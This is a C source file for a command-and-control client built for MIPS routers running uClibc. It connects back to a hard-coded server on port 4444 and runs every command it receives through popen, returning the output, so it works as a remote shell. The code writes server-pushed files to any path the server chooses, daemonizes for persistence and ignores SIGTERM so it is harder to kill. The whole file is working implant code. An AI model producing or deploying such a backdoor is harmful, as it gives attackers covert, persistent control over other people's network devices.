#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/time.h>
#include <signal.h>
#include <time.h>
#include <ctype.h>
#include <fcntl.h>  // Added for fcntl

/* Define MSG_NOSIGNAL if not present (uClibc) */
#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#define SERVER_IP "192.168.1.79"
#define COMMAND_PORT 4444
#define HEARTBEAT_TIMEOUT 60
#define MAX_RETRIES 0

volatile sig_atomic_t keep_running = 1;
char CLIENT_ID[33] = {0};
int HEARTBEAT_PORT = 0;

/* Improved monotonic timer for uClibc/old kernels without reliable RTC */
static unsigned long get_monotonic_time(void) {
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) == 0) {
        return (unsigned long)ts.tv_sec;
    } else {
        perror("[!] clock_gettime failed - using fallback counter");
        static unsigned long counter = 0;
        return counter++;
    }
}

void handle_push_command(int sock, char *cmd, int bytes_read) {
    char dest_path[256];
    long file_size;

    char *header_end = strstr(cmd, "\n");
    if (!header_end) {
        fprintf(stderr, "[!] Malformed PUSH command header.\n");
        return;
    }
    *header_end = '\0'; // Null-terminate the header part

    char *p = cmd + 5; // Skip "PUSH|"
    char *sep = strchr(p, '|');
    if (!sep) {
        fprintf(stderr, "[!] Invalid PUSH command format.\n");
        return;
    }

    size_t path_len = sep - p;
    if (path_len >= sizeof(dest_path)) {
        fprintf(stderr, "[!] Destination path too long.\n");
        return;
    }
    strncpy(dest_path, p, path_len);
    dest_path[path_len] = '\0';

    file_size = atol(sep + 1);
    if (file_size <= 0) {
        fprintf(stderr, "[!] Invalid file size.\n");
        return;
    }

    printf("[*] Receiving file '%s' (%ld bytes)...\n", dest_path, file_size);

    FILE *fp = fopen(dest_path, "wb");
    if (!fp) {
        perror("[!] Failed to open destination file");
        // Consume the rest of the file from the socket to avoid desync
        long remaining_to_consume = file_size;
        char dummy[1024];
        
        // Consume what's already in the buffer
        long initial_content_len = bytes_read - (header_end + 1 - cmd);
        if(initial_content_len > 0) {
            remaining_to_consume -= initial_content_len;
        }

        while (remaining_to_consume > 0) {
            long to_read = remaining_to_consume > sizeof(dummy) ? sizeof(dummy) : remaining_to_consume;
            long consumed_bytes = recv(sock, dummy, to_read, 0);
            if (consumed_bytes <= 0) break;
            remaining_to_consume -= consumed_bytes;
        }
        return;
    }

    // Write the part of the file that was already received in the initial buffer
    long initial_content_len = bytes_read - (header_end + 1 - cmd);
    if (initial_content_len > 0) {
        fwrite(header_end + 1, 1, initial_content_len, fp);
    }

    long remaining = file_size - initial_content_len;
    char buffer[4096];

    while (remaining > 0) {
        long to_read = remaining > sizeof(buffer) ? sizeof(buffer) : remaining;
        long received_bytes = recv(sock, buffer, to_read, 0);
        if (received_bytes <= 0) {
            fprintf(stderr, "[!] Connection lost while receiving file.\n");
            break;
        }
        fwrite(buffer, 1, received_bytes, fp);
        remaining -= received_bytes;
    }

    fclose(fp);

    if (remaining == 0) {
        printf("[+] File received successfully.\n");
    } else {
        fprintf(stderr, "[!] File transfer incomplete.\n");
    }
}

void handle_signal(int sig) {
    printf("[!] Received signal %d, shutting down...\n", sig);
    fflush(stdout);
    keep_running = 0;
}

void generate_client_id() {
    /* uClibc-friendly ID generation */
    unsigned int seed = (unsigned int)(getpid() ^ (unsigned long)&seed);
    srand(seed);
    for (int i = 0; i < 16; i++) {
        unsigned char v = rand() & 0xFF;
        sprintf(CLIENT_ID + (i * 2), "%02x", v);
    }
    CLIENT_ID[32] = '\0';
}

int connect_with_retry(int port) {
    int sock;
    struct sockaddr_in server_addr;
    int retries = 0;
    while (keep_running && (MAX_RETRIES == 0 || retries < MAX_RETRIES)) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("[!] socket failed");
            sleep(5);
            retries++;
            continue;
        }
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        /* Simple address resolution for uClibc */
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
        if (server_addr.sin_addr.s_addr == INADDR_NONE) {
            struct hostent *server = gethostbyname(SERVER_IP);
            if (!server) {
                fprintf(stderr, "[!] DNS resolution failed\n");
                close(sock);
                sleep(5);
                retries++;
                continue;
            }
            memcpy(&server_addr.sin_addr, server->h_addr, sizeof(server_addr.sin_addr));
        }
        /* Removed TIMEO: not supported on this uClibc */
        /* Keepalive to prevent disconnections */
        int keepalive = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive)) < 0) {
            perror("[!] setsockopt SO_KEEPALIVE failed");
        }
        printf("[*] Connecting to %s:%d (attempt %d)...\n",
               inet_ntoa(server_addr.sin_addr), port, retries + 1);
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            fprintf(stderr, "[!] Connection failed: %s\n", strerror(errno));
            close(sock);
            int wait_time = 5 * (1 << (retries < 4 ? retries : 4));
            if (wait_time > 60) wait_time = 60;
            printf("[*] Retrying in %d seconds...\n", wait_time);
            sleep(wait_time);
            retries++;
            continue;
        }
        printf("[+] Connected successfully to command port!\n");
        return sock;
    }
    return -1;
}

int main() {
    char buffer[1024];
    int command_sock = -1;
    int heartbeat_sock = -1;
    struct sockaddr_in heartbeat_addr, server_addr, local_addr;
    socklen_t addr_len = sizeof(local_addr);
    unsigned long last_heartbeat = 0;
    unsigned long start_time = 0;
    setvbuf(stdout, NULL, _IOLBF, 0);  /* Line-buffered for uClibc */
    /* Daemonize for persistence on embedded systems */
    if (daemon(0, 1) < 0) {  /* 0: no chdir, 1: redirect stdio to /dev/null */
        perror("[!] daemon failed");
    }
    /* Set sigaction for portability on uClibc/MIPSel */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handle_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) < 0) {
        perror("[!] sigaction SIGINT failed");
    }

    /* Ignore SIGTERM to resist kill from wrapper */
    sa.sa_handler = SIG_IGN;
    if (sigaction(SIGTERM, &sa, NULL) < 0) {
        perror("[!] sigaction SIGTERM failed");
    }
    if (sigaction(SIGPIPE, &sa, NULL) < 0) {
        perror("[!] sigaction SIGPIPE failed");
    }

    printf("[C2 Client MIPSEL-uClibc] Starting...\n");

    generate_client_id();
    printf("[*] Client ID: %s\n", CLIENT_ID);

    printf("[*] Waiting for network stabilization...\n");
    sleep(3);

    while (keep_running) {
        command_sock = connect_with_retry(COMMAND_PORT);
        if (command_sock < 0) {
            printf("[!] Could not establish command connection\n");
            sleep(10);
            continue;
        }
        heartbeat_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (heartbeat_sock < 0) {
            perror("[!] UDP socket creation failed");
            close(command_sock);
            sleep(5);
            continue;
        }
        int opt = 1;
        if (setsockopt(heartbeat_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
            perror("[!] setsockopt SO_REUSEADDR failed");
        }
        memset(&heartbeat_addr, 0, sizeof(heartbeat_addr));
        heartbeat_addr.sin_family = AF_INET;
        heartbeat_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        heartbeat_addr.sin_port = htons(0);
        if (bind(heartbeat_sock, (struct sockaddr*)&heartbeat_addr, sizeof(heartbeat_addr)) < 0) {
            perror("[!] Bind on heartbeat port failed");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        }
        if (getsockname(heartbeat_sock, (struct sockaddr*)&local_addr, &addr_len) < 0) {
            perror("[!] getsockname failed");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        } else {
            HEARTBEAT_PORT = ntohs(local_addr.sin_port);
            printf("[+] UDP heartbeat on port %d\n", HEARTBEAT_PORT);
        }

        // Set UDP socket to non-blocking to prevent recvfrom hangs
        int flags = fcntl(heartbeat_sock, F_GETFL, 0);
        if (flags == -1) flags = 0;
        if (fcntl(heartbeat_sock, F_SETFL, flags | O_NONBLOCK) < 0) {
            perror("[!] fcntl O_NONBLOCK failed");
        }

        // Send dummy UDP to server to initialize reception in old kernels
        char dummy = 0;
        struct sockaddr_in dummy_addr;
        memset(&dummy_addr, 0, sizeof(dummy_addr));
        dummy_addr.sin_family = AF_INET;
        dummy_addr.sin_port = htons(COMMAND_PORT);  // Arbitrary port on server
        dummy_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
        if (sendto(heartbeat_sock, &dummy, 0, 0, (struct sockaddr*)&dummy_addr, sizeof(dummy_addr)) < 0) {
            perror("[!] Dummy sendto failed");
        } else {
            printf("[*] Dummy UDP sent to initialize reception\n");
        }

        /* Removed TIMEO for UDP: not supported */
        /* Handshake */
        char handshake[256];
        snprintf(handshake, sizeof(handshake), "HELLO|RouterClient|v1.0|%s|%d",
                 CLIENT_ID, HEARTBEAT_PORT);
        printf("[*] Sending handshake...\n");
        if (send(command_sock, handshake, strlen(handshake), MSG_NOSIGNAL) < 0) {
            printf("[!] Handshake failed\n");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        }
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(command_sock, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) {
            printf("[!] Handshake response failed\n");
            close(command_sock);
            close(heartbeat_sock);
            sleep(5);
            continue;
        }
        buffer[bytes] = '\0';
        printf("[+] Server: %s\n", buffer);
        /* Reset timer with monotonic time */
        start_time = get_monotonic_time();
        last_heartbeat = start_time;
        /* Prepare server address for verification */
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);
        if (server_addr.sin_addr.s_addr == INADDR_NONE) {
            struct hostent *server = gethostbyname(SERVER_IP);
            if (server) {
                memcpy(&server_addr.sin_addr, server->h_addr, sizeof(server_addr.sin_addr));
            }
        }
        printf("[*] Entering main loop...\n");
        printf("[*] Heartbeat timeout: %d seconds\n", HEARTBEAT_TIMEOUT);
        while (keep_running) {
            printf("[*] Inner loop start: keep_running=%d, time_now=%lu, last_hb=%lu\n", keep_running, get_monotonic_time(), last_heartbeat);
            fflush(stdout);
            fd_set readfds;
            struct timeval tv_select;
            int max_fd, retval;
            FD_ZERO(&readfds);
            FD_SET(command_sock, &readfds);
            FD_SET(heartbeat_sock, &readfds);
            max_fd = (command_sock > heartbeat_sock) ? command_sock : heartbeat_sock;
            /* Longer timeout */
            tv_select.tv_sec = 30;
            tv_select.tv_usec = 0;
            retval = select(max_fd + 1, &readfds, NULL, NULL, &tv_select);
            if (retval == -1) {
                if (errno == EINTR) continue;
                perror("[!] select() error");
                break;
            }
            if (retval == 0) {
                printf("[*] Select timed out (30s)\n");
                fflush(stdout);
            }
            if (retval > 0) {
                printf("[*] Select returned %d fds ready\n", retval);
                fflush(stdout);
            }
            /* Check timeout with monotonic timer */
            unsigned long now = get_monotonic_time();
            if ((now - last_heartbeat) > HEARTBEAT_TIMEOUT) {
                printf("[!] Heartbeat timeout detected: %lu > %d\n \tDEBUG -> now:%lu, lastHB:%lu",
                    (now - last_heartbeat), HEARTBEAT_TIMEOUT, now, last_heartbeat);
                fflush(stdout);
                break;
            }
            /* DEBUG: print every 30 seconds */
            static unsigned long last_debug = 0;
            if (now - last_debug > 30) {
                printf("[*] Uptime: %lu seconds, Last HB: %lu seconds ago\n",
                       (now - start_time), (now - last_heartbeat));
                last_debug = now;
                fflush(stdout);
            }
            if (FD_ISSET(heartbeat_sock, &readfds)) {
                struct sockaddr_in from_addr;
                socklen_t from_len = sizeof(from_addr);
                memset(buffer, 0, sizeof(buffer));
                bytes = recvfrom(heartbeat_sock, buffer, sizeof(buffer)-1, 0,
                                 (struct sockaddr*)&from_addr, &from_len);
                if (bytes < 0) {
                    if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        printf("[*] recvfrom EAGAIN - continuing\n");
                        fflush(stdout);
                        continue;  // Non-blocking, proceed
                    } else {
                        perror("[!] recvfrom error");
                        fflush(stdout);
                        break;
                    }
                }
                if (bytes > 0) {
                    buffer[bytes] = '\0';
                    /* Verify it comes from the server (IP only, not port) */
                    if (from_addr.sin_addr.s_addr == server_addr.sin_addr.s_addr) {
                        last_heartbeat = now;
                        static int hb_count = 0;
                        hb_count++;
                        if (hb_count <= 5 || hb_count % 10 == 0) {
                            printf("[*] Heartbeat %d received\n", hb_count);
                            fflush(stdout);
                        }
                    } else {
                        printf("[!] Received UDP from unknown IP: %s\n",
                               inet_ntoa(from_addr.sin_addr));
                        fflush(stdout);
                    }
                }
            }
            if (FD_ISSET(command_sock, &readfds)) {
                memset(buffer, 0, sizeof(buffer));
                bytes = recv(command_sock, buffer, sizeof(buffer)-1, 0);
                if (bytes <= 0) {
                    printf("[!] Command connection lost\n");
                    fflush(stdout);
                    break;
                }
                buffer[bytes] = '\0';
                /* Clean newlines */
                char *nl = strchr(buffer, '\n');
                if (nl) *nl = '\0';
                nl = strchr(buffer, '\r');
                if (nl) *nl = '\0';
                printf("[*] Command received: %s\n", buffer);
                fflush(stdout);

                if (strncmp(buffer, "PUSH|", 5) == 0) {
                    handle_push_command(command_sock, buffer, bytes);
                    continue;
                }

                if (strcasecmp(buffer, "EXIT") == 0) {
                    // codice per uscire

                    printf("[*] Exit command received\n");
                    fflush(stdout);
                    send(command_sock, "Goodbye!", 8, MSG_NOSIGNAL);
                    close(command_sock);
                    close(heartbeat_sock);
                    return 0;
                }
                /* Execute command */
                FILE *fp = popen(buffer, "r");
                if (fp) {
                    char result[512];
                    ssize_t sent;
                    int total_sent = 0;
                    while (fgets(result, sizeof(result), fp)) {
                        size_t len = strlen(result);
                        sent = send(command_sock, result, len, MSG_NOSIGNAL);
                        if (sent <= 0) {
                            perror("[!] send failed");
                            fflush(stdout);
                            break;
                        }
                        total_sent += sent;
                    }
                    pclose(fp);
                    if (total_sent == 0) {
                        send(command_sock, "OK\n", 3, MSG_NOSIGNAL);
                        total_sent = 3;
                    }
                    printf("[+] Command executed, sent %d bytes\n", total_sent);
                    fflush(stdout);
                } else {
                    send(command_sock, "ERROR: Command failed\n", 22, MSG_NOSIGNAL);
                }
            }
        }
        printf("[*] Exited inner loop: keep_running=%d\n", keep_running);
        fflush(stdout);
        if (command_sock >= 0) {
            close(command_sock);
            command_sock = -1;
        }
        if (heartbeat_sock >= 0) {
            close(heartbeat_sock);
            heartbeat_sock = -1;
        }
        printf("[*] Connection lost, reconnecting in 10 seconds...\n");
        fflush(stdout);
        sleep(10);
    }

    if (command_sock >= 0) close(command_sock);
    if (heartbeat_sock >= 0) close(heartbeat_sock);
    printf("[*] Client shutting down...\n");
    fflush(stdout);
    return 0;
}
